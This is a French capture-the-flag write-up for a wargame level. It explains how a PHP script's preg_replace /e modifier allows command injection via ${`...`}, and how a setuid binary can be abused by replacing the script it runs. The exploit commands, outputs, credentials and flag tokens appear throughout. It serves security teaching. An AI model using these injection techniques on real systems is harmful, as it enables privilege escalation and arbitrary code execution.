# LEVEL 06

**LOGIN: level06**

**PASSWORD: viuaaale9huek52boumoomioc**

 ----
 
 
 ```
ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

Ici j'ai trouvé deux exploits, le premier avec le code php, le deuxieme dans le binaire c: 

#### Premier exploit
``` 
cat level06.php 
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```


ARVG2 n est jamais utilisé
La fonction y() ne sert a rien car elle est appelé ici :  `"y(\"\\2\")"` et y a pas de `.` ni de `@`.
Seulement le premier appelle à `preg_replace` dans `x()` nous intérrese. 
On peut donc resumer le code comme ceci :
```
function x($y) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "\"\\2\"", $a); return $a; }
$r = x($argv[1]); print $r;
```
L'exploit se trouve dans l'option `e` de `preg_replace`.
*[ e doesn't just execute anything you pass to it. It only executes those parts of the input that match the regex and are then used in the replacement via back references.](https://security.stackexchange.com/questions/151142/understanding-preg-replace-filtering-exploitation)*

```
echo '[x ${`/bin/getflag`} ]' > exploit.txt
chmod 777 exploit.txt
./level06 exploit.txt
Check flag.Here is your token : wiok45aaoguiboiki2tuin6
```

#### Deuxieme exploit

Le binaire `level06` est un code en C. un strace nous montre qu'il appelle le script php : 

`execve("/usr/bin/php", ["/usr/bin/php", "/home/user/level06/level06.php", "", ""], [/* 27 vars */]) = 0`

exploit : 
```
rm level06.php
vim level06.php
#!/usr/bin/php
<?php
exec("/bin/getflag > /tmp/exploit");
?>
exit.

./level06 file1 file2
cat /tmp/exploit
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```

**TOKEN: wiok45aaoguiboiki2tuin6ub
